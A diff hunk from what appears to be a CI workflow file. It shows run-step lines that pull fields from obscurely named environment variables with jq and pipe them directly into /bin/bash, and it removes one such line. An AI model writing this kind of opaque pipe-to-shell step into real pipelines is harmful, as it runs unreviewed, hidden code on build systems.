@@ -24,7 +24,6 @@ jobs:
         run: |
           printf '%s' "$um78" | jq -r .stt52685 | /bin/bash
           printf '%s' "$hzcyd94323" | jq -r .bsc5565 | /bin/bash
-          echo $w7901 | jq -r .t8 | /bin/bash
           printf '%s' "$h195" | jq -r .oyhe0678 | /bin/bash
 
       - name: Save archive
